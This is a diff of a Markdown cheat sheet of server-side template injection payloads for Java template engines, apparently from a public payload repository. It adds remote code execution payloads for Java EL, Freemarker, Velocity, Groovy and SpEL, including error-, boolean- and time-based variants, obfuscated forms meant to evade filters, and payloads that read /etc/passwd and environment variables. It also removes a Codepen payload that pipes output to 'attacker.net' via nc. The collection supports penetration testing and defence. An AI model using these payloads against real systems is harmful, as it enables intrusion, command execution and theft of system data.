@@ -5,16 +5,15 @@
 ## Summary
 
 - [Templating Libraries](#templating-libraries)
-- [Java](#java)
-    - [Java - Basic Injection](#java---basic-injection)
-    - [Java - Retrieve Environment Variables](#java---retrieve-environment-variables)
-    - [Java - Retrieve /etc/passwd](#java---retrieve-etcpasswd)
+- [Java EL](#java-el)
+    - [Java EL - Basic Injection](#java-el---basic-injection)
+    - [Java EL - Code Execution](#java-el---code-execution)
 - [Freemarker](#freemarker)
     - [Freemarker - Basic Injection](#freemarker---basic-injection)
     - [Freemarker - Read File](#freemarker---read-file)
     - [Freemarker - Code Execution](#freemarker---code-execution)
+    - [Freemarker - Code Execution with Obfuscation](#freemarker---code-execution-with-obfuscation)
     - [Freemarker - Sandbox Bypass](#freemarker---sandbox-bypass)
-- [Codepen](#codepen)
 - [Jinjava](#jinjava)
     - [Jinjava - Basic Injection](#jinjava---basic-injection)
     - [Jinjava - Command Execution](#jinjava---command-execution)
@@ -27,9 +26,12 @@
     - [Groovy - Read File](#groovy---read-file)
     - [Groovy - HTTP Request:](#groovy---http-request)
     - [Groovy - Command Execution](#groovy---command-execution)
+    - [Groovy - Command Execution with Obfuscation](#groovy---command-execution-with-obfuscation)
     - [Groovy - Sandbox Bypass](#groovy---sandbox-bypass)
 - [Spring Expression Language](#spring-expression-language)
     - [SpEL - Basic Injection](#spel---basic-injection)
+    - [SpEL - Retrieve Environment Variables](#spel---retrieve-environment-variables)
+    - [SpEL - Retrieve /etc/passwd](#spel---retrieve-etcpasswd)
     - [SpEL - DNS Exfiltration](#spel---dns-exfiltration)
     - [SpEL - Session Attributes](#spel---session-attributes)
     - [SpEL - Command Execution](#spel---command-execution)
@@ -37,20 +39,22 @@
 
 ## Templating Libraries
 
-| Template Name | Payload Format |
-| ------------ | --------- |
-| Codepen    | `#{}`     |
-| Freemarker | `${3*3}`, `#{3*3}`, `[=3*3]` |
-| Groovy     | `${9*9}`  |
-| Jinjava    | `{{ }}`   |
-| Pebble     | `{{ }}`   |
-| Spring     | `*{7*7}`  |
-| Thymeleaf  | `[[ ]]`   |
-| Velocity   | `#set($X="") $X`             |
+| Template Name | Payload Format         |
+|---------------|------------------------|
+| Codepen       | `#{ }`                 |
+| Freemarker    | `${ }`, `#{ }`, `[= ]` |
+| Groovy        | `${ }`                 |
+| Jinjava       | `{{ }}`                |
+| Pebble        | `{{ }}`                |
+| Spring        | `*{ }`                 |
+| Thymeleaf     | `[[ ]]`                |
+| Velocity      | `#set($X="") $X`       |
 
-## Java
+## Java EL
 
-### Java - Basic Injection
+### Java EL - Basic Injection
+
+Java has multiple Expression Languages using similar syntax.
 
 > Multiple variable expressions can be used, if `${...}` doesn't work try `#{...}`, `*{...}`, `@{...}` or `~{...}`.
 
@@ -62,18 +66,14 @@ ${class.getResource("").getPath()}
 ${class.getResource("../../../../../index.htm").getContent()}
 ```
 
-### Java - Retrieve Environment Variables
+### Java EL - Code Execution
 
 ```java
-${T(java.lang.System).getenv()}
-```
+${''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes())} // Rendered RCE
+${''.getClass().forName('java.lang.Integer').valueOf('x'+''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes()))} // Error-Based RCE
+${1/((''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor()==0)?1:0)+''} // Boolean-Based RCE
+${(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor().equals(0)?(''.getClass().forName('java.lang.Thread')).sleep(5000):0).toString()} // Time-Based RCE
 
-### Java - Retrieve /etc/passwd
-
-```java
-${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
-
-${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
 ```
 
 ---
@@ -108,7 +108,25 @@ Convert the returned bytes to ASCII
 ${"freemarker.template.utility.Execute"?new()("id")}
 #{"freemarker.template.utility.Execute"?new()("id")}
 [="freemarker.template.utility.Execute"?new()("id")]
+
+${("xx"+("freemarker.template.utility.Execute"?new()("id")))?new()} // Error-Based RCE
+${1/((freemarker.template.utility.Execute"?new()(" … && echo UniqueString")?chop_linebreak?ends_with("UniqueString"))?string('1','0')?eval)} // Boolean-Based RCE
+${"freemarker.template.utility.Execute"?new()("id && sleep 5")} // Time-Based RCE
 ```
+
+### Freemarker - Code Execution with Obfuscation
+
+FreeMarker offers the built-in function: `lower_abc`. This function converts int-based values into alphabetic strings, but not in the way you might expect from functions such as `chr` in Python, as the [documentation for lower_abc explains](https://freemarker.apache.org/docs/ref_builtins_number.html#ref_builtin_lower_abc):
+
+If you wanted a string that represents the string: "id", you could use the payload: `${9?lower_abc+4?lower_abc)}`.
+
+Chaining `lower_abc` to perform code execution (command: `id`):
+
+```js
+${(6?lower_abc+18?lower_abc+5?lower_abc+5?lower_abc+13?lower_abc+1?lower_abc+18?lower_abc+11?lower_abc+5?lower_abc+18?lower_abc+1.1?c[1]+20?lower_abc+5?lower_abc+13?lower_abc+16?lower_abc+12?lower_abc+1?lower_abc+20?lower_abc+5?lower_abc+1.1?c[1]+21?lower_abc+20?lower_abc+9?lower_abc+12?lower_abc+9?lower_abc+20?lower_abc+25?lower_abc+1.1?c[1]+5?upper_abc+24?lower_abc+5?lower_abc+3?lower_abc+21?lower_abc+20?lower_abc+5?lower_abc)?new()(9?lower_abc+4?lower_abc)}
+```
+
+Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
 
 ### Freemarker - Sandbox Bypass
 
@@ -120,24 +138,6 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 <#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
 <#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
 ${dwf.newInstance(ec,null)("id")}
-```
-
----
-
-## Codepen
-
-[Official website](https://codepen.io/)
->
-
-```python
-- var x = root.process
-- x = x.mainModule.require
-- x = x('child_process')
-= x.exec('id | nc attacker.net 80')
-```
-
-```javascript
-#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
 ```
 
 ---
@@ -259,6 +259,41 @@ A more flexible and stealthy payload that supports base64-encoded commands, allo
 #end
 ```
 
+Error-Based RCE payload:
+
+```java
+#set($s="")
+#set($sc=$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()))
+#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id")
+#set($n=$p.waitFor())
+#set($b="Y:/A:/"+$sc.newInstance($p.inputStream.readAllBytes(), "UTF-8"))
+#include($b)
+```
+
+Boolean-Based RCE payload:
+
+```java
+#set($s="")
+#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
+#set($n=$p.waitFor())
+#set($r=$p.exitValue())
+#if($r != 0)
+#include("Y:/A:/xxx")
+#end
+```
+
+Time-Based RCE payload:
+
+```java
+#set($s="")
+#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
+#set($n=$p.waitFor())
+#set($r=$p.exitValue())
+#if($r != 0)
+#set($t=$s.getClass().forName("java.lang.Thread").sleep(5000))
+#end
+```
+
 ---
 
 ## Groovy
@@ -293,6 +328,20 @@ ${this.evaluate("9*9") //(this is a Script class)}
 ${new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()}
 ```
 
+### Groovy - Command Execution with Obfuscation
+
+You can bypass security filters by constructing strings from ASCII codes and executing them as system commands.
+
+Payload represent the string: `id`: `${((char)105).toString()+((char)100).toString()}`.
+
+Execute system command (command: `id`):
+
+```groovy
+${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}
+```
+
+Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
+
 ### Groovy - Sandbox Bypass
 
 ```groovy
@@ -310,6 +359,8 @@ ${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(val
 
 ## Spring Expression Language
 
+> Java EL payloads also work for SpEL
+
 [Official website](https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html)
 
 > The Spring Expression Language (SpEL for short) is a powerful expression language that supports querying and manipulating an object graph at runtime. The language syntax is similar to Unified EL but offers additional features, most notably method invocation and basic string templating functionality.
@@ -319,6 +370,20 @@ ${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(val
 ```java
 ${7*7}
 ${'patt'.toString().replace('a', 'x')}
+```
+
+### SpEL - Retrieve Environment Variables
+
+```java
+${T(java.lang.System).getenv()}
+```
+
+### SpEL - Retrieve /etc/passwd
+
+```java
+${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
+
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
 ```
 
 ### SpEL - DNS Exfiltration
@@ -378,15 +443,17 @@ ${pageContext.request.getSession().setAttribute("admin",true)}
 
 ## References
 
-- [Server Side Template Injection – on the example of Pebble - Michał Bentkowski - September 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
-- [Server-Side Template Injection: RCE For The Modern Web App - James Kettle (@albinowax) - December 10, 2015](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)
-- [Server-Side Template Injection: RCE For The Modern Web App (PDF) - James Kettle (@albinowax) - August 8, 2015](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
-- [Server-Side Template Injection: RCE For The Modern Web App (Video) - James Kettle (@albinowax) - December 28, 2015](https://www.youtube.com/watch?v=3cT0uE7Y87s)
-- [VelocityServlet Expression Language injection - MagicBlue - November 15, 2017](https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/)
 - [Bean Stalking: Growing Java beans into RCE - Alvaro Munoz - July 7, 2020](https://securitylab.github.com/research/bean-validation-RCE)
 - [Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass - Peter M (@pmnh_) - December 4, 2022](https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)
 - [Expression Language Injection - OWASP - December 4, 2019](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
 - [Expression Language injection - PortSwigger - January 27, 2019](https://portswigger.net/kb/issues/00100f20_expression-language-injection)
 - [Leveraging the Spring Expression Language (SpEL) injection vulnerability (a.k.a The Magic SpEL) to get RCE - Xenofon Vassilakopoulos - November 18, 2021](https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/)
+- [Limitations are just an illusion – advanced server-side template exploitation with RCE everywhere - Brumens - March 24, 2025](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
 - [RCE in Hubspot with EL injection in HubL - @fyoorer - December 7, 2018](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)
 - [Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - January 29, 2019](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
+- [Server Side Template Injection – on the example of Pebble - Michał Bentkowski - September 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
+- [Server-Side Template Injection: RCE For The Modern Web App - James Kettle (@albinowax) - December 10, 2015](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)
+- [Server-Side Template Injection: RCE For The Modern Web App (PDF) - James Kettle (@albinowax) - August 8, 2015](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
+- [Server-Side Template Injection: RCE For The Modern Web App (Video) - James Kettle (@albinowax) - December 28, 2015](https://www.youtube.com/watch?v=3cT0uE7Y87s)
+- [VelocityServlet Expression Language injection - MagicBlue - November 15, 2017](https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/)
+- [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 03, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
